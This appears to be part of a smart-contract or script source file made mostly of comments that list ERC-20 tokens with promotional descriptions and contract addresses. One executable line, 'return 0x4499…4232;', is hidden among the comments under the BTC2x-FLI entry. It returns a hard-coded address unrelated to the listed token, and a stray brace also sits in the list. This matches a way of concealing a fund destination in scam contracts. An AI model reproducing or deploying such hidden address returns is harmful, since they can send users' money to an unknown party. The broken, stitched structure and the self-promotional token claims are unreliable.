// We welcome Crypto Businesses! We know crypto-related businesses are underserved by banks. Our goal is to create a hassle-free banking experience for ICO-backed companies, exchanges, wallets, and brokers. Come and discover the world of crypto-friendly banking.
// 0xe8780b48bdb05f928697a5e8155f672ed91462f7

// Meta (MTA)
// mStable is a protocol that unites stablecoins, lending, and swapping into one robust and easy to use standard.
// 0xa3BeD4E1c75D00fa6f4E5E6922DB7261B5E9AcD2

// KAN (KAN)
// A decentralized cryptocurrency-concentrated & content payment community.
// 0x1410434b0346f5be678d0fb554e5c7ab620f8f4a

// 0xBitcoin Token (0xBTC)
// Pure mined digital currency for Ethereum
// 0xb6ed7644c69416d67b522e20bc294a9a9b405b31

// Ixs Token (IXS)
// IX Swap is the “Uniswap” for security tokens (STO) and tokenized stocks (TSO). IX Swap will be the FIRST platform to provide liquidity pools and automated market making functions for the security token (STO) & tokenized stock industry (TSO).
// 0x73d7c860998ca3c01ce8c808f5577d94d545d1b4

// Shopping.io (SPI)
// Shopping.io is a state of the art platform that unifies all major eCommerce platforms, allowing consumers to enjoy online shopping seamlessly, securely, and cost-effectively.
// 0x9b02dd390a603add5c07f9fd9175b7dabe8d63b7

// SunContract (SNC)
// The SunContract platform aims to empower individuals, with an emphasis on home owners, to freely buy, sell or trade electricity.
// 0xF4134146AF2d511Dd5EA8cDB1C4AC88C57D60404


// Curate (XCUR)
// Curate is a shopping rewards app for rewarding users with free cashback and crypto on all their purchases.
// 0xE1c7E30C42C24582888C758984f6e382096786bd


// CyberMiles (CMT)
// Empowering the Decentralization of Online Marketplaces.
// 0xf85feea2fdd81d51177f6b8f35f0e6734ce45f5f


// PAR Stablecoin (PAR)
// Mimo is a company building DeFi tools in the hope to make blockchain more usable to everyone. They have a lending platform allowing people to borrow PAR and their stable token is algorithmically pegged to the Euro.
// 0x68037790a0229e9ce6eaa8a99ea92964106c4703


// Moeda Loyalty Points (MDA)
// Moeda is a cooperative banking system powered by blockchain, built for everyone.
// 0x51db5ad35c671a87207d88fc11d593ac0c8415bd


// DivergenceProtocol (DIVER)
// A platform for on-chain composable crypto options.
// 0xfb782396c9b20e564a64896181c7ac8d8979d5f4


// Spheroid (SPH)
// Spheroid Universe is a MetaVerse for entertainment, games, advertising, and business in the world of Extended Reality. It operates geo-localized private property on Earth's digital surface (Spaces). The platform’s tech foundation is the Spheroid XR Cloud and the Spheroid Script programming language.
// 0xa0cf46eb152656c7090e769916eb44a138aaa406


// PIKA (PIKA)
// PikaCrypto is an ERC-20 meme token project.
// 0x60f5672a271c7e39e787427a18353ba59a4a3578
	

// Monolith (TKN)
// Non-custodial contract wallet paired with a debit card to spend your ETH & ERC-20 tokens in real life.
// 0xaaaf91d9b90df800df4f55c205fd6989c977e73a


// stakedETH (stETH)
// stakedETH (stETH) from StakeHound is a tokenized representation of ETH staked in Ethereum 2.0 mainnet which allows holders to earn Eth2 staking rewards while participating in the Ethereum DeFi ecosystem. Staking rewards are distributed directly into holders' wallets.
// 0xdfe66b14d37c77f4e9b180ceb433d1b164f0281d


// Salt (SALT)
// SALT lets you leverage your blockchain assets to secure cash loans. We make it easy to get money without having to sell your favorite investment.
// 0x4156D3342D5c385a87D264F90653733592000581


// Tidal Token (TIDAL)
// Tidal is an insurance platform enabling custom pools to cover DeFi protocols.
// 0x29cbd0510eec0327992cd6006e63f9fa8e7f33b7

// Tranche Finance (SLICE)
// Tranche is a decentralized protocol for managing risk. The protocol integrates with any interest accrual token, such as Compound's cTokens and AAVE's aTokens, to create two new interest-bearing instruments, one with a fixed-rate, Tranche A, and one with a variable rate, Tranche B.
// 0x0aee8703d34dd9ae107386d3eff22ae75dd616d1


// BTC 2x Flexible Leverage Index (BTC2x-FLI)
// The WBTC Flexible Leverage Index lets you leverage a collateralized debt position in a safe and efficient way, by abstracting its management into a simple index.
return 0x44996504977eed83B00b1938e9A4660ab42e4232;
// 0x0b498ff89709d3838a063f1dfa463091f9801c2b


// InnovaMinex (MINX)
// Our ultimate goal is making gold and other precious metals more accessible to all the people through our cryptocurrency, InnovaMinex (MINX).
// 0xae353daeed8dcc7a9a12027f7e070c0a50b7b6a4

// UnmarshalToken (MARSH)
// Unmarshal is the multichain DeFi Data Network. It provides the easiest way to query Blockchain data from Ethereum, Binance Smart Chain, and Polkadot.
// 0x5a666c7d92e5fa7edcb6390e4efd6d0cdd69cf37


// VIB (VIB)
// Viberate is a crowdsourced live music ecosystem and a blockchain-based marketplace, where musicians are matched with booking agencies and event organizers.
// 0x2C974B2d0BA1716E644c1FC59982a89DDD2fF724


// WaBi (WaBi)
// Wabi ecosystem connects Brands and Consumers, enabling an exchange of value. Consumers get Wabi for engaging with Ecosystem and redeem the tokens at a Marketplace for thousands of products.
// 0x286BDA1413a2Df81731D4930ce2F862a35A609fE

// Pinknode Token (PNODE)
// Pinknode empowers developers by providing node-as-a-service solutions, removing an entire layer of inefficiencies and complexities, and accelerating product life cycle.
// 0xaf691508ba57d416f895e32a1616da1024e882d2


// Lambda (LAMB)
// Blockchain based decentralized storage solution
// 0x8971f9fd7196e5cee2c1032b50f656855af7dd26


// ABCC Token (AT)
// A cryptocurrency exchange.
// 0xbf8fb919a8bbf28e590852aef2d284494ebc0657

// UNIC (UNIC)
// Unicly is a permissionless, community-governed protocol to combine, fractionalize, and trade NFTs. Built by NFT collectors and DeFi enthusiasts, the protocol incentivizes NFT liquidity and provides a seamless trading experience for fractionalized NFTs.
// 0x94e0bab2f6ab1f19f4750e42d7349f2740513ad5


// SIRIN (SRN)
// SIRIN LABS’ aims to become the world’s leader in secure open source consumer electronics, bridging the gap between the mass market and the blockchain econom
// 0x68d57c9a1c35f63e2c83ee8e49a64e9d70528d25


// Shirtum (SHI)
// Shirtum is a global ecosystem of experiences designed for fans to dive into the history of sports and interact directly with their favorite athletes, clubs and sports brands.
// 0xad996a45fd2373ed0b10efa4a8ecb9de445a4302


// CREDITS (CS)
// CREDITS is an open blockchain platform with autonomous smart contracts and the internal cryptocurrency. The platform is designed to create services for blockchain systems using self-executing smart contracts and a public data registry.
// 0x46b9ad944d1059450da1163511069c718f699d31
	

// Wrapped ETHO (ETHO)
// Immutable, decentralized, highly redundant storage network. Wide ecosystem providing EVM compatibility, IPFS, and SDK to scale use cases and applications. Strong community and dedicated developer team with passion for utilizing revolutionary technology to support free speech and freedom of data.
// 0x0b5326da634f9270fb84481dd6f94d3dc2ca7096

// OpenANX (OAX)
// Decentralized Exchange.
// 0x701c244b988a513c945973defa05de933b23fe1d


// Woofy (WOOFY)
// Wuff wuff.
// 0xd0660cd418a64a1d44e9214ad8e459324d8157f1


// Jenny Metaverse DAO Token (uJENNY)
// Jenny is the first Metaverse DAO to be built on Unicly. It is building one of the most amazing 1-of-1, collectively owned NFT collections in the world.
// 0xa499648fd0e80fd911972bbeb069e4c20e68bf22

// NapoleonX (NPX)
// The crypto asset manager piloting trading bots.
// 0x28b5e12cce51f15594b0b91d5b5adaa70f684a02
}

// PoolTogether (POOL)
// PoolTogether is a protocol for no-loss prize games.
// 0x0cec1a9154ff802e7934fc916ed7ca50bde6844e


// UNCL (UNCL)
// UNCL is the liquidity and yield farmable token of the Unicrypt ecosystem.
// 0x2f4eb47A1b1F4488C71fc10e39a4aa56AF33Dd49


// Medical Token Currency (MTC)
// MTC is an utility token that fuels a healthcare platform providing healthcare information to interested parties on a secure blockchain supported environment.
// 0x905e337c6c8645263d3521205aa37bf4d034e745


// TenXPay (PAY)
// TenX connects your blockchain assets for everyday use. TenX’s debit card and banking licence will allow us to be a hub for the blockchain ecosystem to connect for real-world use cases.
// 0xB97048628DB6B661D4C2aA833e95Dbe1A905B280


// Tierion Network Token (TNT)
// Tierion creates software to reduce the cost and complexity of trust. Anchoring data to the blockchain and generating a timestamp proof.
// 0x08f5a9235b08173b7569f83645d2c7fb55e8ccd8


// DOVU (DOV)
// DOVU, partially owned by Jaguar Land Rover, is a tokenized data economy for DeFi carbon offsetting.
// 0xac3211a5025414af2866ff09c23fc18bc97e79b1


// RipioCreditNetwork (RCN)
// Ripio Credit Network is a global credit network based on cosigned smart contracts and blockchain technology that connects lenders and borrowers located anywhere in the world and on any currency
// 0xf970b8e36e23f7fc3fd752eea86f8be8d83375a6


// UseChain Token (USE)
// Mirror Identity Protocol and integrated with multi-level innovations in technology and structure design.
// 0xd9485499499d66b175cf5ed54c0a19f1a6bcb61a


// TaTaTu (TTU)
// Social Entertainment Platform with an integrated rewards programme.
// 0x9cda8a60dd5afa156c95bd974428d91a0812e054


// GoBlank Token (BLANK)
// BlockWallet is a privacy-focused non-custodial crypto wallet. Besides full privacy functionality, BlockWallet comes packed with an array of features that go beyond privacy for a seamless user experience. Reclaim your financial privacy. Get BlockWallet.
	// 0x41a3dba3d677e573636ba691a70ff2d606c29666

// Rapids (RPD)
// Fast and secure payments across social media via blockchain technology
// 0x4bf4f2ea258bf5cb69e9dc0ddb4a7a46a7c10c53


// VeriSafe (VSF)
// VeriSafe aims to be the catalyst for projects, exchanges and communities to collaborate, creating an ecosystem where transparency, accountability, communication, and expertise go hand-in-hand to set a standard in the industry.
// 0xac9ce326e95f51b5005e9fe1dd8085a01f18450c


// TOP Network (TOP)
// TOP Network is a decentralized open communication network that provides cloud communication services on the blockchain.
// 0xdcd85914b8ae28c1e62f1c488e1d968d5aaffe2b
	

// Virtue Player Points (VPP)
// Virtue Poker is a decentralized platform that uses the Ethereum blockchain and P2P networking to provide safe and secure online poker. Virtue Poker also launched Virtue Gaming: a free-to-play play-to-earn platform that is combined with Virtue Poker creating the first legal global player pool.
// 0x5eeaa2dcb23056f4e8654a349e57ebe5e76b5e6e
	

// Edgeless (EDG)
// The Ethereum smart contract-based that offers a 0% house edge and solves the transparency question once and for all.
// 0x08711d3b02c8758f2fb3ab4e80228418a7f8e39c


// Blockchain Certified Data Token (BCDT)
// The Blockchain Certified Data Token is the fuel of the EvidenZ ecosystem, a blockchain-powered certification technology.
// 0xacfa209fb73bf3dd5bbfb1101b9bc999c49062a5


// Airbloc (ABL)
// AIRBLOC is a decentralized personal data protocol where individuals would be able to monetize their data, and advertisers would be able to buy these data to conduct targeted marketing campaigns for higher ROIs.
// 0xf8b358b3397a8ea5464f8cc753645d42e14b79ea

// DAEX Token (DAX)
// DAEX is an open and decentralized clearing and settlement ecosystem for all cryptocurrency exchanges.
// 0x0b4bdc478791897274652dc15ef5c135cae61e60

// Armor (ARMOR)
// Armor is a smart insurance aggregator for DeFi, built on trustless and decentralized financial infrastructure.
// 0x1337def16f9b486faed0293eb623dc8395dfe46a
	

// Spendcoin (SPND)
// Spendcoin powers the Spend.com ecosystem. The Spend Wallet App & Spend Card give our users a multi-currency digital wallet that they can manage or spend from
// 0xddd460bbd9f79847ea08681563e8a9696867210c
	

// Float Protocol: FLOAT (FLOAT)
// FLOAT is a token that is designed to act as a floating stable currency in the protocol.
// 0xb05097849bca421a3f51b249ba6cca4af4b97cb9


// Public Mint (MINT)
// Public Mint offers a fiat-native blockchain platform open for anyone to build fiat-native applications and accept credit cards, ACH, stablecoins, wire transfers and more.
// 0x0cdf9acd87e940837ff21bb40c9fd55f68bba059


// Internxt (INXT)
// Internxt is working on building a private Internet. Internxt Drive is a decentralized cloud storage service available for individuals and businesses.
// 0x4a8f5f96d5436e43112c2fbc6a9f70da9e4e16d4


// Vader (VADER)
// Swap, LP, borrow, lend, mint interest-bearing synths, and more, in a fairly distributed, governance-minimal protocol built to last.
// 0x2602278ee1882889b946eb11dc0e810075650983


// Launchpool token (LPOOL)
// Launchpool believes investment funds and communities work side by side on projects, on the same terms, towards the same goals. Launchpool aims to harness their strengths and aligns their incentives, the sum is greater than its constituent parts.
// 0x6149c26cd2f7b5ccdb32029af817123f6e37df5b


// Unido (UDO)
// Unido is a technology ecosystem that addresses the governance, security and accessibility challenges of decentralized applications - enabling enterprises to manage crypto assets and capitalize on DeFi.
// 0xea3983fc6d0fbbc41fb6f6091f68f3e08894dc06


// YOU Chain (YOU)
// YOUChain will create a public infrastructure chain that all people can participate, produce personal virtual items and trade personal virtual items on their own.
// 0x34364BEe11607b1963d66BCA665FDE93fCA666a8


// RUFF (RUFF)
// Decentralized open source blockchain architecture for high efficiency Internet of Things application development
// 0xf278c1ca969095ffddded020290cf8b5c424ace2



// OddzToken (ODDZ)
// Oddz Protocol is an On-Chain Option trading platform that expedites the execution of options contracts, conditional trades, and futures. It allows the creation, maintenance, execution, and settlement of trustless options, conditional tokens, and futures in a fast, secure, and flexible manner.
// 0xcd2828fc4d8e8a0ede91bb38cf64b1a81de65bf6


// DIGITAL FITNESS (DEFIT)
// Digital Fitness is a groundbreaking decentralised fitness platform powered by its native token DEFIT connecting people with Health and Fitness professionals worldwide. Pioneer in gamification of the Fitness industry with loyalty rewards and challenges for competing and staying fit and healthy.
// 0x84cffa78b2fbbeec8c37391d2b12a04d2030845e


// UCOT (UCT)
// Ubique Chain Of Things (UCT) is utility token and operates on its own platform which combines IOT and blockchain technologies in supply chain industries.
// 0x3c4bEa627039F0B7e7d21E34bB9C9FE962977518

// VIN (VIN)
// Complete vehicle data all in one marketplace - making automotive more secure, transparent and accessible by all
// 0xf3e014fe81267870624132ef3a646b8e83853a96

// Aurora (AOA)
// Aurora Chain offers intelligent application isolation and enables multi-chain parallel expansion to create an extremely high TPS with security maintain.
// 0x9ab165d795019b6d8b3e971dda91071421305e5a


// Egretia (EGT)
// HTML5 Blockchain Engine and Platform
// 0x8e1b448ec7adfc7fa35fc2e885678bd323176e34


// Standard (STND)
// Standard Protocol is a Collateralized Rebasable Stablecoins (CRS) protocol for synthetic assets that will operate in the Polkadot ecosystem
// 0x9040e237c3bf18347bb00957dc22167d0f2b999d


// TrueFlip (TFL)
// Blockchain games with instant payouts and open source code,
// 0xa7f976c360ebbed4465c2855684d1aae5271efa9


// Strips Token (STRP)
// Strips makes it easy for traders and investors to trade interest rates using a derivatives instrument called a perpetual interest rate swap (perpetual IRS). Strips is a decentralised interest rate derivatives exchange built on the Ethereum layer 2 Arbitrum.
// 0x97872eafd79940c7b24f7bcc1eadb1457347adc9


// Decentr (DEC)
// Decentr is a publicly accessible, open-source blockchain protocol that targets the consumer crypto loans market, securing user data, and returning data value to the user.
// 0x30f271C9E86D2B7d00a6376Cd96A1cFBD5F0b9b3


// Jigstack (STAK)
// Jigstack is an Ethereum-based DAO with a conglomerate structure. Its purpose is to govern a range of high-quality DeFi products. Additionally, the infrastructure encompasses a single revenue and governance feed, orchestrated via the native $STAK token.
// 0x1f8a626883d7724dbd59ef51cbd4bf1cf2016d13


// CoinUs (CNUS)
// CoinUs is a integrated business platform with focus on individual's value and experience to provide Human-to-Blockchain Interface.
// 0x722f2f3eac7e9597c73a593f7cf3de33fbfc3308


// qiibeeToken (QBX)
// The global standard for loyalty on the blockchain. With qiibee, businesses around the world can run their loyalty programs on the blockchain.
// 0x2467aa6b5a2351416fd4c3def8462d841feeecec


// Digix Gold Token (DGX)
// Gold Backed Tokens
// 0x4f3afec4e5a3f2a6a1a411def7d7dfe50ee057bf


// aXpire (AXPR)
// The aXpire project is comprised of a number of business-to-business (B2B) software platforms as well as business-to-consumer (B2C) applications. As its mission, aXpire is focused on software for businesses that helps them automate outdated tasks, increasing efficiency, and profitability.
// 0xdD0020B1D5Ba47A54E2EB16800D73Beb6546f91A


// SpaceChain (SPC)
// SpaceChain is a community-based space platform that combines space and blockchain technologies to build the world’s first open-source blockchain-based satellite network.
// 0x8069080a922834460c3a092fb2c1510224dc066b


// COS (COS)
// One-stop shop for all things crypto: an exchange, an e-wallet which supports a broad variety of tokens, a platform for ICO launches and promotional trading campaigns, a fiat gateway, a market cap widget, and more
// 0x7d3cb11f8c13730c24d01826d8f2005f0e1b348f

// Arcona Distribution Contract (ARCONA)
// Arcona - X Reality Metaverse aims to bring together the virtual and real worlds. The Arcona X Reality environment generate new forms of reality by bringing digital objects into the physical world and bringing physical world objects into the digital world
// 0x0f71b8de197a1c84d31de0f1fa7926c365f052b3

// Posscoin (POSS)
// Posscoin is an innovative payment network and a new kind of money.
// 0x6b193e107a773967bd821bcf8218f3548cfa2503

// Internet Node Token (INT)
// IOT applications
// 0x0b76544f6c413a555f309bf76260d1e02377c02a

// PayPie (PPP)
// PayPie platform brings ultimate trust and transparency to the financial markets by introducing the world’s first risk score algorithm based on business accounting.
// 0xc42209aCcC14029c1012fB5680D95fBd6036E2a0


// Impermax (IMX)
// Impermax is a DeFi ecosystem that enables liquidity providers to leverage their LP tokens.
// 0x7b35ce522cb72e4077baeb96cb923a5529764a00


// 1-UP (1-UP)
// 1up is an NFT powered, 2D gaming platform that aims to decentralize battle-royale style tournaments for the average gamer, allowing them to earn.
// 0xc86817249634ac209bc73fca1712bbd75e37407d


// Centra (CTR)
// Centra PrePaid Cryptocurrency Card
// 0x96A65609a7B84E8842732DEB08f56C3E21aC6f8a


// NFT INDEX (NFTI)
// The NFT Index is a digital asset index designed to track tokens’ performance within the NFT industry. The index is weighted based on the value of each token’s circulating supply.
// 0xe5feeac09d36b18b3fa757e5cf3f8da6b8e27f4c

// Own (CHX)
// Own (formerly Chainium) is a security token blockchain project focused on revolutionising equity markets.
// 0x1460a58096d80a50a2f1f956dda497611fa4f165


// Cindicator (CND)
// Hybrid Intelligence for effective asset management.
// 0xd4c435f5b09f855c3317c8524cb1f586e42795fa


// ASIA COIN (ASIA)
// Asia Coin(ASIA) is the native token of Asia Exchange and aiming to be widely used in Asian markets among diamond-Gold and crypto dealers. AsiaX is now offering crypto trading combined with 260,000+ loose diamonds stock.
// 0xf519381791c03dd7666c142d4e49fd94d3536011
	

// 1World (1WO)
// 1World is first of its kind media token and new generation Adsense. 1WO is used for increasing user engagement by sharing 10% ads revenue with participants and for buying ads.
// 0xfdbc1adc26f0f8f8606a5d63b7d3a3cd21c22b23

// Insights Network (INSTAR)
// The Insights Network’s unique combination of blockchain technology, smart contracts, and secure multiparty computation enables the individual to securely own, manage, and monetize their data.
// 0xc72fe8e3dd5bef0f9f31f259399f301272ef2a2d
	

// Cryptonovae (YAE)
// Cryptonovae is an all-in-one multi-exchange trading ecosystem to manage digital assets across centralized and decentralized exchanges. It aims to provide a sophisticated trading experience through advanced charting features and trade management.
// 0x4ee438be38f8682abb089f2bfea48851c5e71eaf

// CPChain (CPC)
// CPChain is a new distributed infrastructure for next generation Internet of Things (IoT).
// 0xfAE4Ee59CDd86e3Be9e8b90b53AA866327D7c090


// ZAP TOKEN (ZAP)
// Zap project is a suite of tools for creating smart contract oracles and a marketplace to find and subscribe to existing data feeds that have been oraclized
// 0x6781a0f84c7e9e846dcb84a9a5bd49333067b104


// Genaro X (GNX)
// The Genaro Network is the first Turing-complete public blockchain combining peer-to-peer storage with a sustainable consensus mechanism. Genaro's mixed consensus uses SPoR and PoS, ensuring stronger performance and security.
// 0x6ec8a24cabdc339a06a172f8223ea557055adaa5

// PILLAR (PLR)
// A cryptocurrency and token wallet that aims to become the dashboard for its users' digital life.
// 0xe3818504c1b32bf1557b16c238b2e01fd3149c17


// Falcon (FNT)
// Falcon Project it's a DeFi ecosystem which includes two completely interchangeable blockchains - ERC-20 token on the Ethereum and private Falcon blockchain. Falcon Project offers its users the right to choose what suits them best at the moment: speed and convenience or anonymity and privacy.
// 0xdc5864ede28bd4405aa04d93e05a0531797d9d59


// MATRIX AI Network (MAN)
// Aims to be an open source public intelligent blockchain platform
// 0xe25bcec5d3801ce3a794079bf94adf1b8ccd802d


// Genesis Vision (GVT)
// A platform for the private trust management market, built on Blockchain technology and Smart Contracts.
// 0x103c3A209da59d3E7C4A89307e66521e081CFDF0

// CarLive Chain (IOV)
// CarLive Chain is a vertical application of blockchain technology in the field of vehicle networking. It provides services to 1.3 billion vehicle users worldwide and the trillion-dollar-scale automobile consumer market.
// 0x0e69d0a2bbb30abcb7e5cfea0e4fde19c00a8d47

// Cardstack (CARD)
// The experience layer of the decentralized internet.
// 0x954b890704693af242613edef1b603825afcd708

// ZBToken (ZB)
// Blockchain assets financial service provider.
// 0xbd0793332e9fb844a52a205a233ef27a5b34b927

// Cashaa (CAS)
// We welcome Crypto Businesses! We know crypto-related businesses are underserved by banks. Our goal is to create a hassle-free banking experience for ICO-backed companies, exchanges, wallets, and brokers. Come and discover the world of crypto-friendly banking.
// 0xe8780b48bdb05f928697a5e8155f672ed91462f7

// ArcBlock (ABT)
// An open source protocol that provides an abstract layer for accessing underlying blockchains, enabling your application to work on different blockchains.
// 0xb98d4c97425d9908e66e53a6fdf673acca0be986

// POA ERC20 on Foundation (POA20)
// POA Network is an Ethereum-based platform that offers an open-source framework for smart contracts.
// 0x6758b7d441a9739b98552b373703d8d3d14f9e62

// Rubic (RBC)
// Rubic is a multichain DEX aggregator, with instant & cross-chain swaps for Ethereum, BSC, Polygon, Harmony, Tron & xDai, limit orders, fiat on-ramps, and more. The aim of the project is to deliver a complete one-stop full circle decentralized trading platform.
// 0xa4eed63db85311e22df4473f87ccfc3dadcfa3e3

// BTU Protocol (BTU)
// Decentralized Booking Protocol
// 0xb683d83a532e2cb7dfa5275eed3698436371cc9f

// PAID Network (PAID)
// PAID Network is a business toolkit that encompassing SMART Agreements, escrow, reputation-scoring, dispute arbitration and resolution.
// 0x1614f18fc94f47967a3fbe5ffcd46d4e7da3d787

// SENTinel (SENT)
// A modern VPN backed by blockchain anonymity and security.
// 0xa44e5137293e855b1b7bc7e2c6f8cd796ffcb037

// Smart Advertising Transaction Token (SATT)
// SaTT is a new alternative of Internet Ads. Announcers and publishers meet up in a Dapp which acts as an escrow, get neutral metrics and pay fairly publishers.
// 0xdf49c9f599a0a9049d97cff34d0c30e468987389

// Gelato Network Token (GEL)
// Automated smart contract executions on Ethereum.
// 0x15b7c0c907e4c6b9adaaaabc300c08991d6cea05

// Exeedme (XED)
// Exeedme aims to build a trusted Play2Earn blockchain-powered gaming platform where all gamers can make a living doing what they love the most: Playing videogames.
// 0xee573a945b01b788b9287ce062a0cfc15be9fd86

// Stratos Token (STOS)
// Stratos is a decentralized data architecture that provides scalable, reliable, self-balanced storage, database and computation network and offers a solid foundation for data processing.
// 0x08c32b0726c5684024ea6e141c50ade9690bbdcc

// O3 Swap Token (O3)
// O3 Swap is a cross-chain aggregation protocol that enables free trading of native assets between heterogeneous chains, by deploying 'aggregator + asset cross-chain pool' on different public chains and Layer2, provides users to enable cross-chain transactions with one click.
// 0xee9801669c6138e84bd50deb500827b776777d28

// CACHE Gold (CGT)
// CACHE Gold tokens each represent one gram of pure gold stored in vaults around the world. CACHE Gold tokens are redeemable for delivery of physical gold or can be sold for fiat currency.
// 0xf5238462e7235c7b62811567e63dd17d12c2eaa0

// Sentivate (SNTVT)
// A revolutionary new Internet with a hybrid topology consisting of centralized & decentralized systems. The network is designed to go beyond the capabilities of any solely centralized or decentralized one.
// 0x7865af71cf0b288b4e7f654f4f7851eb46a2b7f8

// TokenClub Token (TCT)
// TokenClub, a blockchain-based cryptocurrency investment service community
// 0x4824a7b64e3966b0133f4f4ffb1b9d6beb75fff7

// Walton (WTC)
// Value Internet of Things (VIoT) constructs a perfect commercial ecosystem via the integration of the real world and the blockchain.
// 0xb7cb1c96db6b22b0d3d9536e0108d062bd488f74

// Populous (PPT)
// Aims to rebuild invoice financing block by block, for invoice buyers and sellers.
// 0xd4fa1460f537bb9085d22c7bccb5dd450ef28e3a

// StakeWise (SWISE)
// StakeWise is a liquid Ethereum staking protocol that tokenizes users' deposits and staking rewards as sETH2 (deposit token) and rETH2 (reward token).
// 0x48c3399719b582dd63eb5aadf12a40b4c3f52fa2

// NFTrade Token (NFTD)
// NFTrade is a cross-chain and blockchain-agnostic NFT platform. They are an aggregator of all NFT marketplaces and host the complete NFT lifecycle, allowing anyone to seamlessly create, buy, sell, swap, farm, and leverage NFTs across different blockchains.
// 0x8e0fe2947752be0d5acf73aae77362daf79cb379

// ZMINE Token (ZMN)
// ZMINE Token will be available for purchasing and exchanging for GPUs and use our mining services.
// 0x554ffc77f4251a9fb3c0e3590a6a205f8d4e067d

// InsurAce (INSUR)
// InsurAce is a decentralized insurance protocol, aiming to provide reliable, robust, and carefree DeFi insurance services to DeFi users, with a low premium and sustainable investment returns.
// 0x544c42fbb96b39b21df61cf322b5edc285ee7429

// IceToken (ICE)
// Popsicle finance is a next-gen cross-chain liquidity provider (LP) yield optimization platform
// 0xf16e81dce15b08f326220742020379b855b87df9

// EligmaToken (ELI)
// Eligma is a cognitive commerce platform aiming to create a user-friendly and safe consumer experience with AI and blockchain technology. One of its features is Elipay, a cryptocurrency transaction system.
// 0xc7c03b8a3fc5719066e185ea616e87b88eba44a3

// PolkaFoundry (PKF)
// PolkaFoundry is a platform for making DeFi dapps on Polkadot ecosystem. It comes with some DeFi-friendly services and intergrates with external ones to facilitate the creation of dapps.
// 0x8b39b70e39aa811b69365398e0aace9bee238aeb

// DaTa eXchange Token (DTX)
// As a decentralized marketplace for IoT sensor data using Blockchain technology, Databroker DAO enables sensor owners to turn generated data into revenue streams.
// 0x765f0c16d1ddc279295c1a7c24b0883f62d33f75

// Raiden (RDN)
// The Raiden Network is an off-chain scaling solution, enabling near-instant, low-fee and scalable payments. It’s complementary to the Ethereum blockchain and works with any ERC20 compatible token.
// 0x255aa6df07540cb5d3d297f0d0d4d84cb52bc8e6

// Oraichain Token (ORAI)
// Oraichain is a data oracle platform that aggregates and connects Artificial Intelligence APIs to smart contracts and regular applications.
// 0x4c11249814f11b9346808179cf06e71ac328c1b5

// Atomic Wallet Token (AWC)
// Immutable. Trustless. Distributed. Multi-asset custody-free Wallet with Atomic Swap exchange and decentralized orderbook. Manage your crypto assets in a way Satoshi would use.
// 0xad22f63404f7305e4713ccbd4f296f34770513f4

// Bread (BRD)
// BRD is the simple and secure bitcoin wallet.
// 0x558ec3152e2eb2174905cd19aea4e34a23de9ad6

// VesperToken (VSP)
// Vesper provides a suite of yield-generating products, focused on accessibility, optimization, and longevity.
// 0x1b40183efb4dd766f11bda7a7c3ad8982e998421

// Hop (HOP)
// Hop is a scalable rollup-to-rollup general token bridge. It allows users to send tokens from one rollup or sidechain to another almost immediately without having to wait for the networks challenge period.
// 0xc5102fe9359fd9a28f877a67e36b0f050d81a3cc

// ProBit Token (PROB)
// Global and secure marketplace for digital assets.
// 0xfb559ce67ff522ec0b9ba7f5dc9dc7ef6c139803

// Symbiosis (SIS)
// Symbiosis Finance is a multi-chain liquidity protocol that aggregates exchange liquidity. The SIS token is used as a governance token of Symbiosis DAO and Treasury. Relayers network nodes have to stake SIS to participate in consensus and process swaps.
// 0xd38bb40815d2b0c2d2c866e0c72c5728ffc76dd9

// QunQunCommunities (QUN)
// Incentive community platform based on blockchain technology.
// 0x264dc2dedcdcbb897561a57cba5085ca416fb7b4

// Polkamon (PMON)
// Collect Ultra-Rare Digital Monsters - Grab $PMON & experience the thrill of unveiling ultra-rare digital monsters only you can truly own!
// 0x1796ae0b0fa4862485106a0de9b654efe301d0b2

// BLOCKv (VEE)
// Create and Public Digital virtual goods on the blockchain
// 0x340d2bde5eb28c1eed91b2f790723e3b160613b7

// UnFederalReserveToken (eRSDL)
// unFederalReserve is a banking SaaS company built on blockchain technology. Our banking products are designed for smaller U.S. Treasury chartered banks and non-bank lenders in need of greater liquidity without sacrificing security or compliance.
// 0x5218E472cFCFE0b64A064F055B43b4cdC9EfD3A6

// Block-Chain.com Token (BC)
// Block-chain.com is the guide to the world of blockchain and cryptocurrency.
// 0x2ecb13a8c458c379c4d9a7259e202de03c8f3d19

// Poolz Finance (POOLZ)
// Poolz is a decentralized swapping protocol for cross-chain token pools, auctions, as well as OTC deals. The core code is optimized for DAO ecosystems, enabling startups and project owners to bootstrap liquidity before listing.
// 0x69A95185ee2a045CDC4bCd1b1Df10710395e4e23

// Hegic (HEGIC)
// Hegic is an on-chain peer-to-pool options trading protocol built on Ethereum.
// 0x584bC13c7D411c00c01A62e8019472dE68768430

// Pendle (PENDLE)
// Pendle is essentially a protocol for tokenizing yield and an AMM for trading tokenized yield and other time-decaying assets.
// 0x808507121b80c02388fad14726482e061b8da827

// Amber (AMB)
// Combining high-tech sensors, blockchain protocol and smart contracts, we are building a universally verifiable, community-driven ecosystem to assure the quality, safety & origins of products.
// 0x4dc3643dbc642b72c158e7f3d2ff232df61cb6ce

// nDEX (NDX)
// nDEX Network is a next generation decentralized ethereum token exchange. Our primary goal is to provide a clean, fast and secure trading environment with lowest service charge.
// 0x1966d718a565566e8e202792658d7b5ff4ece469

// RED MWAT (MWAT)
// RED-F is a tokenized franchise offer on the European Union energy market, that allows anyone to create and operate their own retail energy business and earn revenues.
// 0x6425c6be902d692ae2db752b3c268afadb099d3b

// Smart MFG (MFG)
// Smart MFG (MFG) is an ERC20 cryptocurrency token issued by Smart MFG for use in supply chain and manufacturing smart contracts. MFG can be used for RFQ (Request for Quote) incentives, securing smart contract POs (Purchase Orders), smart payments, hardware tokenization & NFT marketplace services.
// 0x6710c63432a2de02954fc0f851db07146a6c0312

// dHedge DAO Token (DHT)
// dHEDGE is a decentralized asset management protocol connecting investment managers with investors on the Ethereum blockchain in a permissionless, trustless fashion.
// 0xca1207647Ff814039530D7d35df0e1Dd2e91Fa84

// Geeq (GEEQ)
// Geeq is a multi-blockchain platform secured by our Proof of Honesty protocol (PoH), safe enough for your most valuable data, cheap enough for IoT, and flexible enough for any use.
// 0x6B9f031D718dDed0d681c20cB754F97b3BB81b78

// PCHAIN (PAI)
// Native multichain system in the world that supports Ethereum Virtual Machine (EVM), which consists of one main chain and multiple derived chains.
// 0xb9bb08ab7e9fa0a1356bd4a39ec0ca267e03b0b3

// ChangeNOW (NOW)
// ChangeNow is a fast and easy exchange service that provides simple cryptocurrency swaps without the annoying need to sign up for anything.
// 0xe9a95d175a5f4c9369f3b74222402eb1b837693b

// Offshift (XFT)
